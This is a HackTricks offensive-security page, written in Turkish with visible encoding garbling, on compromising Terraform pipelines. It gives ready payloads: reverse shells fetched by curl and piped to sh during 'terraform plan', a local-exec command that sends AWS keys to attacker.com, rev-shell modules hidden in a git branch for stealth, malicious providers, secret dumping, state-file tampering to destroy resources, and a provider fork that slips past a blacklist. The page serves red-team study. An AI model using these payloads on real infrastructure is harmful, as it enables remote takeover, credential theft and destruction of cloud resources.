# Terraform GÃ¼venliÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### Temel Bilgiler

[Belgelerden:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, **kod olarak altyapÄ± aracÄ±**dÄ±r ve hem **bulut hem de yerel kaynaklarÄ±** insan tarafÄ±ndan okunabilir yapÄ±landÄ±rma dosyalarÄ±nda tanÄ±mlamanÄ±za olanak tanÄ±r; bu dosyalarÄ± sÃ¼rÃ¼mleyebilir, yeniden kullanabilir ve paylaÅŸabilirsiniz. Daha sonra, tÃ¼m altyapÄ±nÄ±zÄ± yaÅŸam dÃ¶ngÃ¼sÃ¼ boyunca saÄŸlamak ve yÃ¶netmek iÃ§in tutarlÄ± bir iÅŸ akÄ±ÅŸÄ± kullanabilirsiniz. Terraform, hesaplama, depolama ve aÄŸ kaynaklarÄ± gibi dÃ¼ÅŸÃ¼k seviyeli bileÅŸenleri yÃ¶netebilir ve DNS giriÅŸleri ve SaaS Ã¶zellikleri gibi yÃ¼ksek seviyeli bileÅŸenleri de yÃ¶netebilir.

#### Terraform nasÄ±l Ã§alÄ±ÅŸÄ±r?

Terraform, bulut platformlarÄ±nda ve diÄŸer hizmetlerde kaynaklar oluÅŸturur ve yÃ¶netir; bunu uygulama programlama arayÃ¼zleri (API'ler) aracÄ±lÄ±ÄŸÄ±yla yapar. SaÄŸlayÄ±cÄ±lar, Terraform'un eriÅŸilebilir bir API'ye sahip hemen hemen her platform veya hizmetle Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

![](<../.gitbook/assets/image (177).png>)

HashiCorp ve Terraform topluluÄŸu, binlerce farklÄ± tÃ¼rde kaynak ve hizmeti yÃ¶netmek iÃ§in **1700'den fazla saÄŸlayÄ±cÄ±** yazmÄ±ÅŸtÄ±r ve bu sayÄ± artmaya devam etmektedir. TÃ¼m kamuya aÃ§Ä±k saÄŸlayÄ±cÄ±larÄ± [Terraform Registry](https://registry.terraform.io/) Ã¼zerinde bulabilirsiniz; bunlar arasÄ±nda Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birÃ§oklarÄ± bulunmaktadÄ±r.

Temel Terraform iÅŸ akÄ±ÅŸÄ± Ã¼Ã§ aÅŸamadan oluÅŸur:

* **Yaz:** Birden fazla bulut saÄŸlayÄ±cÄ±sÄ± ve hizmeti arasÄ±nda olabilecek kaynaklarÄ± tanÄ±mlarsÄ±nÄ±z. Ã–rneÄŸin, gÃ¼venlik gruplarÄ± ve bir yÃ¼k dengeleyici ile sanal Ã¶zel bulut (VPC) aÄŸÄ±nda bir uygulama daÄŸÄ±tmak iÃ§in bir yapÄ±landÄ±rma oluÅŸturabilirsiniz.
* **Planla:** Terraform, mevcut altyapÄ± ve yapÄ±landÄ±rmanÄ±za dayanarak oluÅŸturacaÄŸÄ±, gÃ¼ncelleyeceÄŸi veya yok edeceÄŸi altyapÄ±yÄ± tanÄ±mlayan bir yÃ¼rÃ¼tme planÄ± oluÅŸturur.
* **Uygula:** OnaylandÄ±ÄŸÄ±nda, Terraform, kaynak baÄŸÄ±mlÄ±lÄ±klarÄ±nÄ± dikkate alarak Ã¶nerilen iÅŸlemleri doÄŸru sÄ±rayla gerÃ§ekleÅŸtirir. Ã–rneÄŸin, bir VPC'nin Ã¶zelliklerini gÃ¼ncelleyip o VPC'deki sanal makine sayÄ±sÄ±nÄ± deÄŸiÅŸtirirseniz, Terraform, sanal makineleri Ã¶lÃ§eklendirmeden Ã¶nce VPC'yi yeniden oluÅŸturur.

![](<../.gitbook/assets/image (215).png>)

### Terraform LaboratuvarÄ±

BilgisayarÄ±nÄ±za terraform'u kurun.

Burada bir [rehber](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada terraform'u indirmenin [en iyi yolu](https://www.terraform.io/downloads) var.

### Terraform'da RCE

Terraform'un **bir web sayfasÄ± veya bir aÄŸ hizmeti** sunan bir platformu yoktur, bu nedenle terraform'u tehlikeye atmanÄ±n tek yolu **terraform yapÄ±landÄ±rma dosyalarÄ±nÄ± eklemek/deÄŸiÅŸtirmek** olabilir.

Ancak, terraform, dÃ¼zgÃ¼n Ã§alÄ±ÅŸabilmesi iÃ§in farklÄ± konumlara **ayrÄ±lmÄ±ÅŸ eriÅŸim** saÄŸlayacaÄŸÄ± iÃ§in **tehlikeye atÄ±lmasÄ± Ã§ok hassas bir bileÅŸendir**.

Bir saldÄ±rganÄ±n terraform'un Ã§alÄ±ÅŸtÄ±ÄŸÄ± sistemi tehlikeye atabilmesinin ana yolu, **terraform yapÄ±landÄ±rmalarÄ±nÄ± depolayan depoyu tehlikeye atmaktÄ±r**, Ã§Ã¼nkÃ¼ bir noktada bunlar **yorumlanacaktÄ±r**.

AslÄ±nda, bir PR oluÅŸturulduktan sonra **terraform plan/uygula** iÅŸlemlerini otomatik olarak gerÃ§ekleÅŸtiren Ã§Ã¶zÃ¼mler mevcuttur, bunlardan biri **Atlantis**'dir:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

EÄŸer bir terraform dosyasÄ±nÄ± tehlikeye atmayÄ± baÅŸarÄ±rsanÄ±z, birisi `terraform plan` veya `terraform apply` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda RCE gerÃ§ekleÅŸtirmek iÃ§in farklÄ± yollar vardÄ±r.

#### Terraform planÄ±

Terraform planÄ±, terraform'da **en Ã§ok kullanÄ±lan komut**dur ve terraform kullanan geliÅŸtiriciler/Ã§Ã¶zÃ¼mler bunu sÃ¼rekli olarak Ã§aÄŸÄ±rÄ±r, bu nedenle **RCE elde etmenin en kolay yolu**, bir `terraform plan` sÄ±rasÄ±nda rastgele komutlar Ã§alÄ±ÅŸtÄ±racak bir terraform yapÄ±landÄ±rma dosyasÄ±nÄ± zehirlemektir.

**DÄ±ÅŸ saÄŸlayÄ±cÄ± kullanarak**

Terraform, Terraform ile dÄ±ÅŸ programlar arasÄ±nda bir arayÃ¼z saÄŸlamak iÃ§in [`external` saÄŸlayÄ±cÄ±sÄ±nÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `plan` sÄ±rasÄ±nda rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in `external` veri kaynaÄŸÄ±nÄ± kullanabilirsiniz.

AÅŸaÄŸÄ±daki gibi bir ÅŸeyi terraform yapÄ±landÄ±rma dosyasÄ±na enjekte etmek, `terraform plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir rev shell Ã§alÄ±ÅŸtÄ±racaktÄ±r:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Ã–zel bir saÄŸlayÄ±cÄ± kullanma**

Bir saldÄ±rgan, [Terraform Registry](https://registry.terraform.io/) 'ye bir [Ã¶zel saÄŸlayÄ±cÄ±](https://learn.hashicorp.com/tutorials/terraform/provider-setup) gÃ¶nderebilir ve ardÄ±ndan bunu bir Ã¶zellik dalÄ±ndaki Terraform koduna ekleyebilir ([buradan Ã¶rnek](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
SaÄŸlayÄ±cÄ± `init` sÄ±rasÄ±nda indirilir ve `plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ niyetli kodu Ã§alÄ±ÅŸtÄ±rÄ±r.

Bir Ã¶rneÄŸi [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

**DÄ±ÅŸ bir referans kullanma**

Bahsedilen her iki seÃ§enek de faydalÄ±dÄ±r ancak Ã§ok gizli deÄŸildir (ikincisi daha gizli ama birincisinden daha karmaÅŸÄ±ktÄ±r). Bu saldÄ±rÄ±yÄ± **daha gizli bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, bu Ã¶nerileri takip ederek:

* Rev shell'i doÄŸrudan terraform dosyasÄ±na eklemek yerine, rev shell'i iÃ§eren **dÄ±ÅŸ bir kaynaÄŸÄ±** yÃ¼kleyebilirsiniz:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* DÄ±ÅŸ kaynakta, **ref** Ã¶zelliÄŸini kullanarak **repo iÃ§indeki bir dalda terraform rev shell kodunu gizleyin**, ÅŸÃ¶yle bir ÅŸey: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Uygula

Terraform apply, tÃ¼m deÄŸiÅŸiklikleri uygulamak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, ayrÄ±ca **kÃ¶tÃ¼ niyetli bir Terraform dosyasÄ±nÄ±** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile enjekte ederek RCE elde etmek iÃ§in de kÃ¶tÃ¼ye kullanÄ±labilir.**\
Sadece aÅŸaÄŸÄ±daki gibi bir yÃ¼kÃ¼n `main.tf` dosyasÄ±nda sona erdiÄŸinden emin olmanÄ±z gerekir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ã–nceki teknikten **Ã¶nerileri takip ederek** bu saldÄ±rÄ±yÄ± **daha gizli bir ÅŸekilde dÄ±ÅŸ referanslar kullanarak** gerÃ§ekleÅŸtirin.

### Gizli Bilgilerin DÃ¶kÃ¼mÃ¼

`terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rarak **terraform tarafÄ±ndan kullanÄ±lan gizli deÄŸerlerin dÃ¶kÃ¼lmesini** saÄŸlamak iÃ§in terraform dosyasÄ±na ÅŸu ÅŸekilde bir ÅŸey ekleyebilirsiniz:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Terraform Durum DosyalarÄ±nÄ± KÃ¶tÃ¼ye Kullanma

Terraform durum dosyalarÄ± Ã¼zerinde yazma eriÅŸiminiz varsa ancak terraform kodunu deÄŸiÅŸtiremiyorsanÄ±z, [**bu araÅŸtÄ±rma**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan yararlanmak iÃ§in bazÄ± ilginÃ§ seÃ§enekler sunmaktadÄ±r:

#### KaynaklarÄ± Silme <a href="#deleting-resources" id="deleting-resources"></a>

KaynaklarÄ± yok etmenin 2 yolu vardÄ±r:

1. **GerÃ§ek yok edilecek kaynaÄŸa iÅŸaret eden rastgele bir isimle durum dosyasÄ±na bir kaynak ekleyin**

Terraform, kaynaÄŸÄ±n mevcut olmamasÄ± gerektiÄŸini gÃ¶receÄŸi iÃ§in, onu yok edecektir (belirtilen gerÃ§ek kaynak kimliÄŸini takip ederek). Ã–nceki sayfadan Ã¶rnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Silinmesi gereken kaynaÄŸÄ±, gÃ¼ncellenemeyecek ÅŸekilde deÄŸiÅŸtirin (bu nedenle silinip yeniden oluÅŸturulacak)**

Bir EC2 Ã¶rneÄŸi iÃ§in, Ã¶rneÄŸin tÃ¼rÃ¼nÃ¼ deÄŸiÅŸtirmek, terraform'un onu silip yeniden oluÅŸturmasÄ± iÃ§in yeterlidir.

#### RCE

AyrÄ±ca, [Ã¶zel bir saÄŸlayÄ±cÄ± oluÅŸturmak](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) ve terraform durum dosyasÄ±ndaki saÄŸlayÄ±cÄ±lardan birini kÃ¶tÃ¼ niyetli olanla deÄŸiÅŸtirmek veya kÃ¶tÃ¼ niyetli saÄŸlayÄ±cÄ± ile boÅŸ bir kaynak eklemek de mÃ¼mkÃ¼ndÃ¼r. Orijinal araÅŸtÄ±rmadan Ã¶rnek:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Kara listeye alÄ±nmÄ±ÅŸ saÄŸlayÄ±cÄ±yÄ± deÄŸiÅŸtirme

`hashicorp/external` kara listeye alÄ±ndÄ±ÄŸÄ±nda bir durumla karÅŸÄ±laÅŸÄ±rsanÄ±z, `external` saÄŸlayÄ±cÄ±sÄ±nÄ± aÅŸaÄŸÄ±daki gibi yeniden uygulayabilirsiniz. Not: https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayÄ±nlanan external saÄŸlayÄ±cÄ±sÄ±nÄ±n bir fork'unu kullanÄ±yoruz. Kendi fork'unuzu veya yeniden uygulamanÄ±zÄ± da yayÄ±nlayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Sonra `external`'Ä± normal ÅŸekilde kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Denetim AraÃ§larÄ±

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit eder.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan, Kod Olarak AltyapÄ± iÃ§in bir statik kod analizÃ¶rÃ¼dÃ¼r.

### Referanslar

* [Atlantis GÃ¼venliÄŸi](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
